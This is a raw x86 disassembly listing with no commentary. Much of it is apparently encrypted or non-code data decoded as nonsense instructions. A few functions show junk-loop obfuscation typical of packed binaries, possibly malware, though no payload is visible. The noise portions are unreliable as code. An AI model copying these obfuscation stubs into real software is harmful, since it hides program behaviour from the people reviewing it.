  4059b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4059b2:	rol    BYTE PTR [ebx+0x2b927765],0x7b
  4059b9:	adc    ecx,DWORD PTR [ecx+0x5d]
  4059bc:	popa   
  4059bd:	xchg   ebp,eax
  4059be:	retf   
  4059bf:	call   0x35a6:0x668f7be1
  4059c6:	enter  0xbd5a,0x6a
  4059ca:	pop    ebx
  4059cb:	push   esi
  4059cc:	sub    DWORD PTR [edi+0x2a],edi
  4059cf:	or     bh,cl
  4059d1:	fnstenv [edi+0x5e]
  4059d4:	out    dx,al
  4059d5:	sub    bh,BYTE PTR [esi-0x23]
  4059d8:	sbb    eax,0xbd13a6c4
  4059dd:	ja     0x405974
  4059df:	fcmove st,st(5)
  4059e1:	add    eax,0xf51014b7
  4059e6:	cs push cs
  4059e8:	call   0x72c04df
  4059ed:	addr16 jle 0x4059cb
  4059f0:	sub    al,0xef
  4059f2:	lods   al,BYTE PTR ds:[esi]
  4059f3:	pop    ecx
  4059f4:	call   0x5ba0cab8
  4059f9:	xor    edx,ebp
  4059fb:	aaa    
  4059fc:	aad    0x6e
  4059fe:	pushf  
  4059ff:	sbb    BYTE PTR [edx-0x44f15d88],ah
  405a05:	mov    eax,ds:0xc993375
  405a0a:	xor    DWORD PTR [ecx+ecx*1-0xd],ebx
  405a0e:	aaa    
  405a0f:	inc    edi
  405a10:	aaa    
  405a11:	stos   DWORD PTR es:[edi],eax
  405a12:	ins    DWORD PTR es:[edi],dx
  405a13:	(bad)  
  405a14:	mov    cs,WORD PTR [ebp-0x5c1d096e]
  405a1a:	mov    BYTE PTR [ecx],ch
  405a1c:	xor    eax,0x551456a6
  405a21:	stos   DWORD PTR es:[edi],eax
  405a22:	(bad)  
  405a23:	cwde   
  405a24:	cmp    dh,bl
  405a26:	mov    DWORD PTR [esi],ebx
  405a28:	sub    bh,BYTE PTR [esi+eax*1-0x66]
  405a2c:	adc    eax,0xb152e7f
  405a31:	or     ah,dl
  405a33:	dec    eax
  405a34:	adc    al,0x85
  405a36:	aam    0xba
  405a38:	es dec esi
  405a3a:	jnp    0x405a5f
  405a3c:	pop    edx
  405a3d:	cwde   
  405a3e:	repz les ebx,FWORD PTR [ebp-0x5f]
  405a42:	scas   al,BYTE PTR es:[edi]
  405a43:	lods   al,BYTE PTR ds:[esi]
  405a44:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405a45:	lods   al,BYTE PTR ds:[esi]
  405a46:	lds    ecx,FWORD PTR [esi]
  405a48:	adc    bl,bl
  405a4a:	mov    edi,esi
  405a4c:	or     DWORD PTR [ecx+0x4e],0x67106c6a
  405a53:	mov    al,ds:0xc4783579
  405a58:	mov    gs,esp
  405a5a:	sar    al,1
  405a5c:	or     edx,ebx
  405a5e:	push   ebx
  405a5f:	fneni(8087 only) 
  405a61:	mov    dl,0xcd
  405a63:	jmp    0x78e1:0xa6f46a37
  405a6a:	cdq    
  405a6b:	mov    BYTE PTR [edx],bh
  405a6d:	test   ch,al
  405a6f:	les    esp,FWORD PTR [edi]
  405a71:	mov    ah,0x15
  405a73:	add    DWORD PTR [ebx],esi
  405a75:	fdiv   DWORD PTR [ebp-0x80]
  405a78:	mov    ebp,0x8765b53c
  405a7d:	add    DWORD PTR [ebp-0x72],0x78
  405a81:	inc    BYTE PTR [eax-0x24]
  405a84:	rcr    BYTE PTR [eax+0x4215f603],0x4f
  405a8b:	lods   eax,DWORD PTR ds:[esi]
  405a8c:	test   al,0x3e
  405a8e:	lock mov ds,edi
  405a91:	adc    DWORD PTR ds:0x53522195,esp
  405a97:	mov    DWORD PTR [edx+0x73],0x6c0dc40d
  405a9e:	call   0x3127dac2
  405aa3:	out    dx,al
  405aa4:	es icebp 
  405aa6:	data16 loopne 0x405aef
  405aa9:	push   0xffffffaf
  405aab:	and    bl,0x9a
  405aae:	stos   DWORD PTR es:[edi],eax
  405aaf:	dec    ebx
  405ab0:	pop    ebp
  405ab1:	in     al,0xb8
  405ab3:	mov    edi,0x36b60ed2
  405ab8:	out    0xb8,eax
  405aba:	loop   0x405b0d
  405abc:	shr    DWORD PTR [esi],1
  405abe:	je     0x405b2d
  405ac0:	nop
  405ac1:	cmp    DWORD PTR [edx-0x47],0xcc9ac8cc
  405ac8:	or     eax,0x846a6b61
  405acd:	lods   eax,DWORD PTR ds:[esi]
  405ace:	in     al,dx
  405acf:	jb     0x405a5c
  405ad1:	mov    esp,DWORD PTR ds:0x64fca9b9
  405ad7:	jb     0x405ad0
  405ad9:	icebp  
  405ada:	mov    ecx,DWORD PTR [ebp+0x10]
  405add:	and    ecx,eax
  405adf:	or     ecx,0x81161d8f
  405ae5:	mov    eax,ecx
  405ae7:	pop    ebp
  405ae8:	ret    0x18
  405aeb:	push   ebp
  405aec:	mov    ebp,esp
  405aee:	push   ecx
  405aef:	mov    DWORD PTR [ebp-0x4],0xf89c853d
  405af6:	add    DWORD PTR ds:0x43441d,ecx
  405afc:	mov    eax,DWORD PTR [ebp-0x4]
  405aff:	mov    edx,DWORD PTR [ebp+0x10]
  405b02:	mov    ecx,DWORD PTR ds:0x4343a6
  405b08:	mov    ecx,DWORD PTR [ecx]
  405b0a:	add    DWORD PTR ds:0x434429,ecx
  405b10:	mov    ecx,0x7510855
  405b15:	xor    eax,ecx
  405b17:	sub    DWORD PTR ds:0x432dce,0x487f
  405b21:	add    eax,0x32729c
  405b26:	xor    DWORD PTR ds:0x434396,0x6d44
  405b30:	mov    DWORD PTR [edx],eax
  405b32:	inc    DWORD PTR ds:0x43436e
  405b38:	mov    eax,DWORD PTR [ebp+0x14]
  405b3b:	sub    DWORD PTR ds:0x432dc2,0x7e8e
  405b45:	mov    edx,DWORD PTR [ebp+0x10]
  405b48:	mov    DWORD PTR [edx+0x4],eax
  405b4b:	mov    eax,DWORD PTR [ebp+0x18]
  405b4e:	mov    edx,DWORD PTR [ebp+0x10]
  405b51:	adc    DWORD PTR ds:0x43436e,0x4326fc
  405b5b:	mov    DWORD PTR [edx+0x8],eax
  405b5e:	mov    eax,DWORD PTR [ebp+0x1c]
  405b61:	mov    edx,DWORD PTR [ebp+0x10]
  405b64:	sub    DWORD PTR ds:0x432dc6,0x432dda
  405b6e:	mov    DWORD PTR [edx+0xc],eax
  405b71:	and    DWORD PTR ds:0x434376,0x0
  405b7b:	jmp    0x405b8b
  405b80:	mov    eax,ds:0x434376
  405b85:	inc    eax
  405b86:	mov    ds:0x434376,eax
  405b8b:	cmp    DWORD PTR ds:0x434376,0x14
  405b92:	jae    0x405bcd
  405b98:	cmp    DWORD PTR ds:0x434376,0x7
  405b9f:	jne    0x405bb0
  405ba5:	push   0x400000
  405baa:	call   DWORD PTR ds:0x432cee
  405bb0:	cmp    DWORD PTR ds:0x434376,0x6
  405bb7:	jne    0x405bc8
  405bbd:	mov    eax,ds:0x434376
  405bc2:	inc    eax
  405bc3:	mov    ds:0x434376,eax
  405bc8:	jmp    0x405b80
  405bcd:	mov    eax,DWORD PTR [ebp+0x20]
  405bd0:	mov    edx,DWORD PTR [ebp+0x10]
  405bd3:	mov    DWORD PTR [edx+0x10],eax
  405bd6:	mov    eax,eax
  405bd8:	mov    eax,DWORD PTR [ebp+0x14]
  405bdb:	test   eax,eax
  405bdd:	mov    eax,DWORD PTR [ebp+0x8]
  405be0:	jne    0x405be9
  405be6:	mov    eax,DWORD PTR [ebp+0xc]
  405be9:	xor    eax,ecx
  405beb:	add    eax,0x32729c
  405bf0:	leave  
  405bf1:	ret    0x1c
  405bf4:	push   ebp
  405bf5:	mov    ebp,esp
  405bf7:	sub    esp,0x78
  405bfa:	add    DWORD PTR ds:0x434382,edi
  405c00:	mov    eax,ds:0x4161a0
  405c05:	sbb    DWORD PTR ds:0x432dd2,0x30a0
  405c0f:	mov    DWORD PTR [ebp-0x10],eax
  405c12:	and    DWORD PTR ds:0x434372,0x0
  405c1c:	jmp    0x405c2c
  405c21:	mov    eax,ds:0x434372
  405c26:	inc    eax
  405c27:	mov    ds:0x434372,eax
  405c2c:	cmp    DWORD PTR ds:0x434372,0x12
  405c33:	jae    0x405cc7
  405c39:	cmp    DWORD PTR ds:0x434372,0x8
  405c40:	jne    0x405c56
  405c46:	push   0x59ce
  405c4b:	push   0x3d0e
  405c50:	call   DWORD PTR ds:0x4329c6
  405c56:	cmp    DWORD PTR ds:0x434372,0x7
  405c5d:	jne    0x405c71
  405c63:	xor    eax,eax
  405c65:	or     eax,DWORD PTR ds:0x434372
  405c6b:	inc    eax
  405c6c:	mov    ds:0x434372,eax
  405c71:	jmp    0x405c21
  405c76:	and    DWORD PTR ds:0x4326ec,0x0
  405c80:	jmp    0x405c93
  405c85:	xor    eax,eax
  405c87:	add    eax,DWORD PTR ds:0x4326ec
  405c8d:	inc    eax
  405c8e:	mov    ds:0x4326ec,eax
  405c93:	cmp    DWORD PTR ds:0x4326ec,0x19
  405c9a:	jae    0x405cc7
  405ca0:	cmp    DWORD PTR ds:0x4326ec,0x24
  405ca7:	jne    0x405cb8
  405cad:	push   0x2979
  405cb2:	call   DWORD PTR ds:0x432cf2
  405cb8:	jmp    0x405c85
  405cbd:	adc    DWORD PTR ds:0x432700,0x4b3c
  405cc7:	mov    eax,ds:0x4162ac
  405ccc:	mov    DWORD PTR [ebp-0x30],eax
  405ccf:	mov    eax,ds:0x43439a
  405cd4:	adc    DWORD PTR ds:0x434372,eax
  405cda:	mov    DWORD PTR [ebp-0xc],0xf89c8531
  405ce1:	mov    DWORD PTR [ebp-0x14],0xf89c8530
  405ce8:	and    DWORD PTR ds:0x432dce,0x0
  405cf2:	jmp    0x405d05
  405cf7:	xor    eax,eax
  405cf9:	xor    eax,DWORD PTR ds:0x432dce
  405cff:	inc    eax
  405d00:	mov    ds:0x432dce,eax
  405d05:	cmp    DWORD PTR ds:0x432dce,0x17
  405d0c:	jae    0x405d74
  405d12:	cmp    DWORD PTR ds:0x432dce,0x24
  405d19:	jne    0x405d65
  405d1f:	push   0x4328ab
  405d24:	push   DWORD PTR [ebp-0x24]
  405d27:	push   DWORD PTR [ebp-0x1c]
  405d2a:	push   0x2bca
  405d2f:	push   0x26af
  405d34:	push   0x4217
  405d39:	push   0x24e1
  405d3e:	push   0x5f7a
  405d43:	push   DWORD PTR [ebp-0x28]
  405d46:	push   0x4151
  405d4b:	push   0x4efd
  405d50:	push   0x2a4d
  405d55:	push   0x1961
  405d5a:	push   0x8799
  405d5f:	call   DWORD PTR ds:0x432c36
  405d65:	jmp    0x405cf7
  405d6a:	sbb    DWORD PTR ds:0x432dca,0x4665
  405d74:	mov    eax,DWORD PTR [ebp-0xc]
  405d77:	push   ebx
  405d78:	sbb    DWORD PTR ds:0x43442d,0x432dd2
  405d82:	push   esi
  405d83:	push   edi
  405d84:	mov    esi,0x7510855
  405d89:	and    DWORD PTR ds:0x4326fc,0xdb
  405d93:	jmp    0x4060e0
  405d98:	mov    ecx,0x75ce7592
  405d9d:	jmp    0x6331ef03
  405da2:	sub    BYTE PTR [ebx],bl
  405da4:	inc    edi
  405da5:	jle    0x405d67
  405da7:	dec    eax
  405da8:	mov    esi,DWORD PTR [eax+esi*2]
  405dab:	jo     0x405dcd
  405dad:	jge    0x405e1f
  405daf:	jo     0x405d9c
  405db1:	adc    eax,0xadc1bbb7
  405db6:	jp     0x405dcf
  405db8:	popf   
  405db9:	sub    dl,bl
  405dbb:	pop    esp
  405dbc:	cmc    
  405dbd:	jmp    0x5ece97af
  405dc2:	and    DWORD PTR [ecx-0x20],esp
  405dc5:	gs mov edi,0xc68cb793
  405dcb:	mov    dh,0xc3
  405dcd:	(bad)  
  405dce:	fsub   st,st(1)
  405dd0:	mov    bh,0x90
  405dd2:	aas    
  405dd3:	jb     0x405e05
  405dd5:	hlt    
  405dd6:	aaa    
  405dd7:	cmc    
  405dd8:	dec    edx
  405dd9:	mov    ecx,0x99e86664
  405dde:	mov    bh,0x40
  405de0:	add    ebp,DWORD PTR [edi-0x40]
  405de3:	mov    edx,0xd45fdc13
  405de8:	adc    eax,0x4721839d
  405ded:	adc    ecx,DWORD PTR ds:[esi]
  405df0:	das    
  405df1:	ret    0x5de1
  405df4:	sahf   
  405df5:	dec    esi
  405df6:	lock jg 0x405dbc
  405df9:	fadd   QWORD PTR [eax-0x74]
  405dfc:	or     ebp,edi
  405dfe:	stos   BYTE PTR es:[edi],al
  405dff:	mov    bl,0x2d
  405e01:	fs mov ch,0xb2
  405e04:	jae    0x405e55
  405e06:	push   esp
  405e07:	jmp    0xd2f23876
  405e0c:	inc    BYTE PTR [ecx-0x5593148d]
  405e12:	int    0x74
  405e14:	mov    ch,0xa5
  405e16:	pop    ds
  405e17:	(bad)  
  405e18:	dec    ecx
  405e19:	jge    0x405e62
  405e1b:	sub    ebx,DWORD PTR [ebx+0x16836f36]
  405e21:	imul   eax
  405e23:	sbb    DWORD PTR [ecx-0x65],esp
  405e26:	loop   0x405e7c
  405e28:	fst    QWORD PTR ds:0x582c85b
  405e2e:	mul    BYTE PTR [eax]
  405e30:	int3   
  405e31:	(bad)  
  405e32:	cli    
  405e33:	dec    esp
  405e34:	push   ebx
  405e35:	adc    BYTE PTR [edi+0x3d],cl
  405e38:	mov    esp,ebp
  405e3a:	icebp  
  405e3b:	(bad)  
  405e3d:	mov    ch,0xa7
  405e3f:	in     eax,0x2b
  405e41:	push   ss
  405e42:	cdq    
  405e43:	not    BYTE PTR [edx]
  405e45:	in     al,dx
  405e46:	jne    0x405ec7
  405e48:	dec    ebp
  405e49:	out    0x2a,eax
  405e4b:	retf   0x8d44
  405e4e:	(bad)  
  405e4f:	shl    cl,cl
  405e51:	jmp    0xed5:0x35bed4ec
  405e58:	fadd   QWORD PTR [ebp+0x4f]
  405e5b:	adc    al,BYTE PTR [edx+0x673cae3d]
  405e61:	je     0x405e5f
  405e63:	ins    DWORD PTR es:[edi],dx
  405e64:	fdivr  st,st(3)
  405e66:	mov    ch,0xe7
  405e68:	xchg   esp,eax
  405e69:	outs   dx,BYTE PTR ds:[esi]
  405e6a:	jle    0x405ec0
  405e6c:	cdq    
  405e6d:	imul   esp,DWORD PTR [edx-0x316eb428],0xffffffca
  405e74:	sub    al,0x29
  405e76:	push   esi
  405e77:	push   edx
  405e78:	mov    cl,0x2
  405e7a:	push   ds
  405e7b:	sbb    BYTE PTR [ecx+edi*8+0x30600d64],dh
  405e82:	cmp    eax,0x92413289
  405e87:	xchg   DWORD PTR [esi+0x6e],esp
  405e8a:	aam    0x67
  405e8c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405e8d:	retf   
  405e8e:	popa   
  405e8f:	loop   0x405e2b
  405e91:	xor    BYTE PTR [edx-0x2b],0xa3
  405e95:	aam    0x71
  405e97:	sbb    bl,BYTE PTR [edi]
  405e99:	inc    esi
  405e9a:	aas    
  405e9b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405e9c:	jne    0x405eb8
  405e9e:	xor    BYTE PTR [edx],ah
  405ea0:	lahf   
  405ea1:	jns    0x405e35
  405ea3:	sbb    esp,edi
  405ea5:	pop    edx
  405ea6:	jns    0x405eaa
  405ea8:	sub    BYTE PTR [eax+0xfacb564],ch
  405eae:	xchg   ebp,eax
  405eaf:	and    BYTE PTR [edx+0x5d],0x34
  405eb3:	aas    
  405eb4:	test   eax,0x4e59ed9b
  405eb9:	sub    eax,0x8c70ba88
  405ebe:	add    bh,0x90
  405ec1:	sbb    BYTE PTR [ebx+0x23e32182],0x3
  405ec8:	aas    
  405ec9:	xchg   ecx,eax
  405eca:	adc    bh,BYTE PTR [ebp+ecx*8+0x78]
  405ece:	jo     0x405e71
  405ed0:	pop    ds
  405ed1:	jae    0x405e7d
  405ed3:	iret   
  405ed4:	fild   WORD PTR [ecx]
  405ed6:	push   esp
  405ed7:	xor    al,0x29
  405ed9:	in     al,dx
  405eda:	jle    0x405f47
  405edc:	lock dec edx
  405ede:	lahf   
  405edf:	sub    edi,DWORD PTR [edi-0x6a796714]
  405ee5:	jmp    0x871c82e5
  405eea:	jmp    0x543f:0x1f13e7ab
  405ef1:	dec    esp
  405ef2:	sub    esp,0x7a
  405ef5:	scas   al,BYTE PTR es:[edi]
  405ef6:	(bad)  
  405ef7:	(bad)  
  405ef8:	xor    al,0x1
  405efa:	fwait
  405efb:	jp     0x405f1e
  405efd:	test   al,cl
  405eff:	dec    ecx
  405f00:	jae    0x405f55
  405f02:	push   ecx
  405f03:	cwde   
  405f04:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405f05:	pop    eax
  405f06:	push   es
  405f07:	sub    DWORD PTR [esi+0x2c],esp
  405f0a:	in     eax,dx
  405f0b:	pushf  
  405f0c:	xchg   edi,eax
  405f0d:	pop    ss
  405f0e:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  405f10:	int3   
  405f11:	jmp    0x3177:0x8184c217
  405f18:	addr16 xor al,0x6a
  405f1b:	pop    edi
  405f1c:	pop    es
  405f1d:	push   es
  405f1e:	sub    BYTE PTR [edx],dh
  405f20:	jno    0x405f45
  405f22:	pop    ss
  405f23:	loop   0x405f04
  405f25:	leave  
  405f26:	sar    BYTE PTR [ebp-0x32f3c791],1
  405f2c:	mov    edx,0x1f7a66c4
  405f31:	out    0x21,eax
  405f33:	mov    BYTE PTR ds:[eax+0x7e],dl
  405f37:	lods   eax,DWORD PTR ds:[esi]
  405f38:	les    esi,FWORD PTR [esi-0x66]
  405f3b:	cld    
  405f3c:	jb     0x405f14
  405f3e:	jae    0x405f28
  405f40:	mov    bh,0xaf
  405f42:	mov    bl,0xb
  405f44:	push   ebx
  405f45:	xchg   BYTE PTR [esp+eax*1],ch
  405f48:	mov    al,BYTE PTR [esi-0x5d]
  405f4b:	jns    0x405f40
  405f4d:	aam    0xb4
  405f4f:	imul   edi,DWORD PTR ds:0xc524e9ff,0x40
  405f56:	popf   
  405f57:	std    
  405f58:	repnz test BYTE PTR [edi],al
  405f5b:	test   BYTE PTR [ebp+esi*8+0x24a257f4],bl
  405f62:	or     eax,DWORD PTR [ebx+0x5b]
  405f65:	nop
  405f66:	imul   eax,DWORD PTR [edx],0x659fefa7
  405f6c:	and    ch,0xa
  405f6f:	mov    BYTE PTR [ebp+0x3f],0x5c
  405f73:	mov    dl,BYTE PTR [ecx+0x26]
  405f76:	xchg   esp,eax
  405f77:	mov    DWORD PTR [eax+0x2ca0dfaf],edx
  405f7d:	push   esp
  405f7e:	and    ebp,DWORD PTR ds:0xee69f9e7
  405f84:	sbb    DWORD PTR ds:0xf1fde052,0x14f651a9
  405f8e:	dec    ebp
  405f8f:	inc    ebp
  405f90:	sub    ah,cl
  405f92:	js     0x405f19
  405f94:	pushf  
  405f95:	std    
  405f96:	xor    al,0x91
  405f98:	pop    ss
  405f99:	sbb    BYTE PTR [ebx-0x5be9ff1a],cl
  405f9f:	gs pop ebp
  405fa1:	push   edx
  405fa2:	xlat   BYTE PTR ds:[ebx]
  405fa3:	imul   edi,DWORD PTR [esi-0xfde3e49],0x51
  405faa:	add    ch,BYTE PTR [ecx-0x2a134556]
  405fb0:	sub    BYTE PTR [eax-0xea182b3],al
  405fb6:	mov    ebx,0x317b07d4
  405fbb:	push   0x7a
  405fbd:	sbb    dh,BYTE PTR [ebx+0x238f0bdf]
  405fc3:	or     bh,BYTE PTR ds:0x58056a83
  405fc9:	fiadd  DWORD PTR [ecx-0x34]
  405fcc:	mov    dh,0x72
  405fce:	jmp    0x40604a
  405fd0:	ins    DWORD PTR es:[edi],dx
  405fd1:	(bad)  
  405fd2:	dec    esi
  405fd3:	fwait
  405fd4:	adc    BYTE PTR [edx-0x6c],dh
  405fd7:	jl     0x405f7d
  405fd9:	fdivr  QWORD PTR [eax+edi*2-0x45]
  405fdd:	sbb    eax,0x2d10b07f
  405fe2:	(bad)  
  405fe3:	fcom   QWORD PTR [esi-0x6a]
  405fe6:	push   esp
  405fe7:	sub    al,0x77
  405fe9:	outs   dx,BYTE PTR ds:[esi]
  405fea:	popf   
  405feb:	inc    esp
  405fec:	sub    al,0x31
  405fee:	mov    bh,0xd5
  405ff0:	lods   eax,DWORD PTR ds:[esi]
  405ff1:	fld    DWORD PTR [ebx]
  405ff3:	aas    
  405ff4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405ff5:	mov    cl,0x45
  405ff7:	ret    0x5bdd
  405ffa:	bound  ecx,QWORD PTR [ebx-0x3bf6dda4]
  406000:	adc    al,0xb4
  406002:	scas   al,BYTE PTR es:[edi]
  406003:	sub    al,0xc0
  406005:	ins    BYTE PTR es:[edi],dx
  406006:	pop    edi
  406007:	dec    bh
  406009:	test   al,0x9
  40600b:	mov    bl,0x39
  40600d:	cmp    ebx,ecx
  40600f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406010:	jg     0x405fd5
  406012:	pop    ss
  406013:	out    0x68,al
  406015:	ja     0x406052
  406017:	mov    esi,0xbfa3788b
  40601c:	aas    
  40601d:	das    
  40601e:	loope  0x406082
  406020:	xlat   BYTE PTR ds:[ebx]
  406021:	jg     0x405fc3
  406023:	mov    es,WORD PTR [ebp-0x7b]
  406026:	and    al,0x98
  406028:	inc    ebp
  406029:	push   ds
  40602a:	xchg   ebp,eax
  40602b:	xchg   ebp,eax
  40602c:	loope  0x406023
  40602e:	imul   eax,DWORD PTR [esi-0x2c1cf00d],0x275572ea
  406038:	cmp    eax,0xd13e5b60
  40603d:	stc    
  40603e:	push   eax
  40603f:	mov    dh,BYTE PTR [ecx+0xe]
  406042:	inc    esi
  406043:	xor    al,0x5d
  406045:	pop    esp
  406046:	imul   esi,DWORD PTR [esi-0x395f5258],0xdced260d
  406050:	pop    ebp
  406051:	xchg   edx,eax
  406052:	inc    esi
  406053:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406054:	stc    
  406055:	sbb    BYTE PTR [ecx],al
  406057:	add    BYTE PTR [ecx-0x4c],dl
  40605a:	popf   
  40605b:	mov    esi,0x89356de9
  406060:	and    ch,ch
  406062:	daa    
  406063:	shl    esp,1
  406065:	loopne 0x406090
  406067:	addr16 ret 0x968a
  40606b:	loope  0x406007
  40606d:	test   al,0x42
  40606f:	stos   DWORD PTR es:[edi],eax
  406070:	jne    0x40602c
  406072:	mov    al,ds:0xac348bed
  406077:	xchg   eax,ebp
  406079:	pop    eax
  40607a:	mov    dl,0x9b
  40607c:	icebp  
  40607d:	stos   BYTE PTR es:[edi],al
  40607e:	out    0xfc,eax
  406080:	fwait
  406081:	dec    esi
  406082:	repnz int3 
  406084:	sar    DWORD PTR [edx+ebp*1],1
  406087:	pop    ss
  406088:	scas   al,BYTE PTR es:[edi]
  406089:	in     eax,0x59
  40608b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40608c:	stc    
  40608d:	ins    DWORD PTR es:[edi],dx
  40608e:	(bad)  
  40608f:	mov    esp,0x3caa5489
  406094:	dec    edi
  406095:	pop    edx
  406096:	jo     0x4060a1
  406098:	in     eax,dx
  406099:	repz inc bx
  40609c:	(bad)  
  40609d:	xchg   esi,eax
  40609e:	dec    edi
  40609f:	cs lock push ds
  4060a2:	in     al,0x41
  4060a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4060a5:	jno    0x4060d4
  4060a7:	lods   eax,DWORD PTR ds:[esi]
  4060a8:	daa    
  4060a9:	or     eax,0x9c0f4c27
  4060ae:	adc    BYTE PTR [edi],cl
  4060b0:	dec    esp
  4060b1:	cmp    edx,DWORD PTR [edi-0x16]
  4060b4:	in     eax,0x30
  4060b6:	arpl   WORD PTR [edx],ax
  4060b8:	mov    ds:0x1ce3b401,eax
  4060bd:	stos   BYTE PTR es:[di],al
  4060bf:	xchg   ebx,eax
  4060c0:	sub    bl,BYTE PTR [esi]
  4060c2:	jmp    0xd01b:0xbecde73b
  4060c9:	ror    ch,0x47
  4060cc:	inc    ebx
  4060cd:	push   0xd73fb0b1
  4060d2:	inc    eax
  4060d3:	imul   edi,DWORD PTR [ebx],0x883b4df6
  4060d9:	fist   DWORD PTR [ebp+0x23b205ff]
  4060df:	repnz xor eax,esi
  4060e2:	add    DWORD PTR ds:0x432dbe,edi
  4060e8:	mov    edi,0x32729c
  4060ed:	and    DWORD PTR ds:0x43441d,0x3e7d
  4060f7:	add    eax,edi
  4060f9:	jmp    0x406446
  4060fe:	xchg   esp,eax
  4060ff:	test   eax,0x69f5e9e0
  406104:	xchg   ecx,eax
  406105:	jno    0x406179
  406107:	xchg   edx,eax
  406108:	js     0x406147
  40610a:	outs   dx,BYTE PTR ds:[esi]
  40610b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40610c:	mov    eax,ds:0x7031bb53
  406111:	jo     0x406133
  406113:	jge    0x406185
  406115:	jo     0x40612f
  406117:	mov    ah,0x5d
  406119:	imul   edi,DWORD PTR [ebx],0x70c931ca
  40611f:	xchg   esp,edi
  406121:	jp     0x4060fc
  406123:	add    eax,0x3e36f55a
  406128:	cs pop esp
  40612a:	and    DWORD PTR [ebx],esp
  40612c:	retf   0xbd1c
  40612f:	(bad)  
  406131:	loop   0x4060fb
  406133:	mov    BYTE PTR [esi+ebx*2+0xbfb02b1],cl
  40613a:	inc    eax
  40613b:	mov    edi,0xc64b81a1
  406140:	jp     0x40610c
  406142:	sar    BYTE PTR [ebx-0x58b8c2f5],cl
  406148:	retf   
  406149:	mov    ss,WORD PTR [ecx+0x35b9977f]
  40614f:	push   ebp
  406150:	inc    esi
  406151:	push   esi
  406152:	xchg   edx,eax
  406153:	popf   
  406154:	inc    edx
  406155:	xor    eax,0x290beacb
  40615a:	add    bl,BYTE PTR [ecx+ebp*2+0x64]
  40615e:	mov    al,0x1
  406160:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406161:	jno    0x4061a1
  406163:	test   al,0x30
  406165:	dec    esp
  406166:	cwde   
  406167:	sbb    ah,bl
  406169:	cmc    
  40616a:	jb     0x406181
  40616c:	test   ch,ah
  40616e:	push   edi
  40616f:	cs in  al,dx
  406171:	enter  0x7f2d,0x2e
  406175:	or     edx,DWORD PTR [esi]
  406177:	repnz pop es
  406179:	pusha  
  40617a:	repnz loope 0x4061a0
  40617d:	and    eax,0x94288f4b
  406182:	inc    edi
  406183:	sub    eax,0xeac39083
  406188:	fcom   st(1)
  40618a:	jg     0x4061a1
  40618c:	cmp    BYTE PTR [esi-0x6bef7144],ah
  406192:	pusha  
  406193:	int    0x1a
  406195:	pop    ss
  406196:	pop    esi
  406197:	leave  
  406198:	push   esp
  406199:	add    DWORD PTR [ebx+0x64],ebp
  40619c:	pop    ds
  40619d:	mov    dl,0x7c
  40619f:	int    0x80
  4061a1:	dec    esp
  4061a2:	and    ch,cl
  4061a4:	aaa    
  4061a5:	push   edi
  4061a6:	aaa    
  4061a7:	cmp    esp,DWORD PTR [edx-0x6b7426b3]
  4061ad:	add    al,0x4f
  4061af:	cmp    DWORD PTR [eax-0x4d],0x3c
  4061b3:	retf   0x6d95
  4061b6:	jecxz  0x40616f
  4061b8:	getsec 
  4061ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4061bb:	nop
  4061bc:	jae    0x406165
  4061be:	test   BYTE PTR [ecx+eiz*2],ah
  4061c1:	inc    esi
  4061c3:	adc    BYTE PTR [edi+0x16],al
  4061c6:	js     0x4061c0
  4061c8:	sti    
  4061c9:	push   es
  4061ca:	adc    al,0x45
  4061cc:	ins    DWORD PTR es:[edi],dx
  4061cd:	fwait
  4061ce:	push   ecx
  4061cf:	and    eax,0x90fd31de
  4061d4:	add    DWORD PTR [edi-0x7e60a9b2],ecx
  4061da:	(bad)  
  4061db:	pushf  
  4061dc:	test   dl,bh
  4061de:	in     al,0xfc
  4061e0:	adc    al,0xd
  4061e2:	imul   DWORD PTR [ebx-0x76]
  4061e5:	aaa    
  4061e6:	outs   dx,BYTE PTR ds:[esi]
  4061e7:	data16 sub dh,BYTE PTR ds:[ecx+0x23]
  4061ec:	jns    0x4061be
  4061ee:	mov    dl,0x92
  4061f0:	(bad)  
  4061f1:	out    0x9a,eax
  4061f3:	mov    DWORD PTR cs:[edi-0x51dfc599],eax
  4061fa:	fstp   QWORD PTR [edi]
  4061fc:	jnp    0x406219
  4061fe:	lds    edx,FWORD PTR [eax]
  406200:	or     eax,0x4ae5cef
  406205:	jb     0x4061a5
  406207:	or     BYTE PTR [ecx+ebp*1],al
  40620a:	and    al,0xa1
  40620c:	and    al,0x11
  40620e:	inc    esp
  40620f:	inc    ebp
  406210:	jmp    0x406234
  406212:	mov    ecx,0x8787ee5b
  406217:	loop   0x4061b4
  406219:	shl    dh,cl
  40621b:	nop
  40621c:	xchg   BYTE PTR [edi],dh
  40621e:	repnz ds mov dh,0x8c
  406222:	std    
  406223:	aam    0x3a
  406225:	or     ecx,esi
  406227:	xor    al,BYTE PTR [edx]
  406229:	pop    ecx
  40622a:	push   es
  40622b:	mov    ebx,0x2c07703b
  406230:	stc    
  406231:	pop    ds
  406232:	or     eax,0x616f5bf
  406237:	fnstsw WORD PTR [eax]
  406239:	outs   dx,DWORD PTR ds:[esi]
  40623a:	popa   
  40623b:	pop    ss
  40623c:	bound  eax,QWORD PTR [ebx]
  40623e:	cdq    
  40623f:	jp     0x40625e
  406241:	pop    ecx
  406242:	sub    BYTE PTR [edi+ebx*4-0x3e],bh
  406246:	vhaddps ymm3,ymm1,YMMWORD PTR [ecx-0x548728bf]
  40624e:	xchg   ebx,eax
  406250:	xchg   edi,eax
  406251:	int3   
  406252:	dec    esp
  406253:	jne    0x406227
  406255:	lock fs nop
  406258:	lods   al,BYTE PTR ds:[esi]
  406259:	pop    eax
  40625a:	pusha  
  40625b:	gs mov ah,0x9f
  40625e:	stc    
